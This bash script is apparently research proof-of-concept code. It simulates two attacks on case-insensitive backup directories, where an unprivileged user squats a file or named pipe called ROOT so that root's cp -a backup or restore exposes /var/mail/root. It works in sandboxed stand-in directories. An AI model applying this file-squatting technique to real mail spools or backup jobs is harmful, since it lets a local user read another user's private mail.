#!/bin/bash

# Tunables
CASE_DIR=/mercury/research/caseaware/tmp
ICASE_DIR=/mercury/research/casefolding/tmp
DEBUG=0

#############################
# Helper functions
#############################
function debug()
{
	[ $DEBUG = 1 ] && echo -e $*
}

function err()
{
	echo "err: $*" 1>&2
	rm -f /tmp/scenario-*
	exit 1
}

function verify_not_root()
{
	[ $EUID == 0 ] && err "Cannot be run as root"
}

function verify_icase()
{
	# Create files w/ diff. case and verify their inodes match
	debug "in verify_icase()"

	tmpfile="$ICASE_DIR/tmpfile"
	TMPFILE="$ICASE_DIR/TMPFILE"

	# Create files
	touch "$tmpfile"
	tmpfile_inode=$(stat -c "%i" "$tmpfile")

	touch "$TMPFILE"
	TMPFILE_inode=$(stat -c "%i" "$TMPFILE")

	# Verify that inodes match
	if [[ "$tmpfile_inode" != "$TMPFILE_inode" ]]; then
		rm $tmpfile $TMPFILE
		err "ICASE_DIR is not case insensitive"
	else
		rm $tmpfile
	fi
}

function clear_state()
{
	debug "in clear_state()"

	# Sanity checks
	[[ ! "$CASE_DIR" || "$CASE_DIR" == "/" ]] && err "Bad CASE_DIR"
	[[ ! "$ICASE_DIR" || "$ICASE_DIR" == "/" ]] && err "Bad ICASE_DIR"

	[ -L "$CASE_DIR" ] && err "CASE_DIR is a symlink"
	[ -L "$ICASE_DIR" ] && err "ICASE_DIR is a symlink"

	# Try creating missing directories
	[ ! -d "$CASE_DIR" ] && (mkdir "$CASE_DIR" || err "Cannot create CASE_DIR")
	[ ! -d "$ICASE_DIR" ] && (mkdir "$ICASE_DIR" || err "Cannot create ICASE_DIR")

	# Ensure directories are empty
	rm -f ${ICASE_DIR}/* ${CASE_DIR}/*
}

#############################
# Scenarios
#############################
function scenario_root_mail_1()
{
	docstring="
	Scenario: Access root's mail after backup & restore (Bad binding)\n
	Adversary = user running script\n
	Victim = root\n

	Necessary adversary perms:\n
	\t- part of 'mail' group\n
	\t- access to /var/mail\n
	
	Result: After restoring from backup, adversary can read /var/mail/root.\n
		\t All new emails will be readable by the adversary.\n

	Drawback: Old emails are not readable by adversary.
	" 
	debug "in $FUNCNAME()"
	debug $docstring

	SRC=$CASE_DIR   # simulate /var/mail
	DST=$ICASE_DIR  # simulate backup directory (icase)

	TMPFILE=$(mktemp /tmp/scenario-XXXX)
	echo "root's mail" >$TMPFILE

	# Setup SRC dir
	sudo install -m 700 -o root $TMPFILE $SRC/root

	# Adversary squats file
	install -m 777 /dev/null $SRC/ROOT

	# Backup run by superuser
	sudo cp -a $SRC/* $DST/

	# Result: $DST/root has perms 777 & is empty.
	# This is because $DST/root is actually $SRC/ROOT.
	test `stat -c "%a" $DST/root` == 777 || err "$FUNCNAME: bad backup"

	# Simulate a restore (by superuser)
	sudo rm $SRC/*
	sudo cp -a $DST/* $SRC/

	# Result: Now $SRC/root is accessible by the adversary
	test `stat -c "%a" $SRC/root` == 777 || err "$FUNCNAME: bad restore"

	# Cleanup
	rm $TMPFILE
}

function scenario_root_mail_2()
{
	docstring="
	Scenario: Access root's mail after >=2 backups (Type confusion)\n
	Adversary = user running script\n
	Victim = root\n

	Necessary adversary perms:\n
	\t- part of 'mail' group\n
	\t- access to /var/mail\n
	\t- access to backup dir\n
	
	Result: When backup is run the second time, the adversay can read root's\n
	        mail from the squatted pipe.\n
	" 
	debug "in $FUNCNAME()"
	debug $docstring

	SRC=$CASE_DIR   # simulate /var/mail
	DST=$ICASE_DIR  # simulate backup directory (icase)

	TMPFILE=$(mktemp /tmp/scenario-XXXX)
	ADVFILE=$(mktemp /tmp/scenario-XXXX)
	echo "root's mail" >$TMPFILE

	# Setup SRC dir
	sudo install -m 700 -o root $TMPFILE $SRC/root

	# Adversary squats pipe
	mkfifo -m 777 $SRC/ROOT

	# Backup run by superuser (first time)
	sudo cp -a $SRC/* $DST/

	# Result: $DST/root has perms 777 & is empty.
	# This is because $DST/root is actually $SRC/ROOT.
	test `stat -c "%a" $DST/root` == 777 || err "$FUNCNAME: bad perms on backup"
	test `stat -c "%F" $DST/root` == "fifo" || err "$FUNCNAME: bad file type"

	# Similate: adversary reading from the pipe
	cat $DST/root >$ADVFILE &
	ADVPID=$!

	# Backup run by superuser (second time)
	sudo cp -a $SRC/* $DST/

	# Verify that adversary gets correct data
	wait $ADVPID
	sudo cmp -s $SRC/root $ADVFILE || err "$FUNCNAME: adv. gets bad contents"

	# Cleanup
	rm $TMPFILE
	rm $ADVFILE
}

#############################
# Selecting Scenario
#############################
verify_not_root
clear_state
verify_icase

# clear_state
# scenario_root_mail_1

clear_state
scenario_root_mail_2

# support cmd opts
